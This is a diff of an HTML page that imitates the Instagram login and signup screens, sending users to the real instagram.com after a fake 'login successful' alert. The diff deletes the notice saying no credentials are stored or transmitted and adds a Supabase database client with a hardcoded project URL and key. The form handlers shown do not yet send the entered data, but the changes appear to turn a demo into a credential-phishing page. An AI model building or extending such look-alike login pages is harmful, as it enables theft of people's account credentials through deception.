@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -53,12 +54,8 @@ input {
     outline: none;
     margin-bottom: 18px;
 }
-input:focus {
-    border-color: #0095f6;
-}
-input::placeholder {
-    color: #aaa;
-}
+input:focus { border-color: #0095f6; }
+input::placeholder { color: #aaa; }
 button {
     width: 100%;
     height: 55px;
@@ -71,9 +68,7 @@ button {
     cursor: pointer;
     margin-top: 18px;
 }
-button:hover {
-    background: #0866c6;
-}
+button:hover { background: #0866c6; }
 .forgot {
     text-align: center;
     margin-top: 38px;
@@ -81,9 +76,7 @@ button:hover {
     cursor: pointer;
     color: white;
 }
-.bottom {
-    margin-top: 70px;
-}
+.bottom { margin-top: 70px; }
 .facebook {
     background: #292a2c;
     color: #ccc;
@@ -111,7 +104,6 @@ button:hover {
 
 <div class="container">
 
-    <!-- LOGIN FORM -->
     <div class="form active" id="loginForm">
         <h2>Log into your account</h2>
         <form onsubmit="demoLogin(event)">
@@ -121,12 +113,11 @@ button:hover {
         </form>
         <div class="forgot" onclick="alert('Demo: Password recovery')">Forgot password?</div>
         <div class="bottom">
-            <button class="【entity-facebook¦canonical_name=Facebook】" onclick="alert('Demo only: Social login is not connected')">f &nbsp; Log in with 【entity-Facebook¦canonical_name=Facebook】</button>
-            <button class="switch" onclick="showSignup()">Create new account</button>
+            <button class="facebook" type="button" onclick="alert('Demo only: Social login is not connected')">f &nbsp; Social login demo</button>
+            <button class="switch" type="button" onclick="showSignup()">Create new account</button>
         </div>
     </div>
 
-    <!-- SIGNUP FORM -->
     <div class="form" id="signupForm">
         <h2>Create a new account</h2>
         <form onsubmit="demoSignup(event)">
@@ -137,19 +128,33 @@ button:hover {
             <button type="submit">Sign up</button>
         </form>
         <div class="bottom">
-            <button class="switch" onclick="showLogin()">Already have an account? Log in</button>
+            <button class="switch" type="button" onclick="showLogin()">Already have an account? Log in</button>
         </div>
     </div>
 
-    <p class="note">⚠️ EDUCATIONAL SIMULATION ONLY • No credentials are stored or transmitted.</p>
+    <p class="note">EDUCATIONAL DEMO APPLICATION</p>
 
 </div>
+
+<!-- SUPABASE CONNECTION -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+<script>
+const SUPABASE_URL = "https://bpmcajxcuiwxqtcmovse.supabase.co";
+const SUPABASE_KEY = "sb_publishable_bFxV495wsO6w3LlIZNllSw_WdoS3e5-";
+
+const supabaseClient = window.supabase.createClient(
+    SUPABASE_URL,
+    SUPABASE_KEY
+);
+</script>
 
 <script>
 function showSignup() {
     document.getElementById("loginForm").classList.remove("active");
     document.getElementById("signupForm").classList.add("active");
 }
+
 function showLogin() {
     document.getElementById("signupForm").classList.remove("active");
     document.getElementById("loginForm").classList.add("active");
@@ -157,18 +162,20 @@ function showLogin() {
 
 function demoLogin(event) {
     event.preventDefault();
-    
+    alert("Demo login successful! Redirecting to instagram...");
     setTimeout(() => {
-      window.location.href = "https://www.instagram.com/";
+      window.location.href = "https://www.instagram.com/";  // <-- Yaha
     }, 1000);
+
 }
 
 function demoSignup(event) {
     event.preventDefault();
-    
+    alert("Demo signup successful! Redirecting to instagram...");
     setTimeout(() => {
-      window.location.href = "https://www.instagram.com/";
+      window.location.href = "https://www.instagram.com/";  // <-- Yaha bhi
     }, 1000);
+
 }
 </script>
 
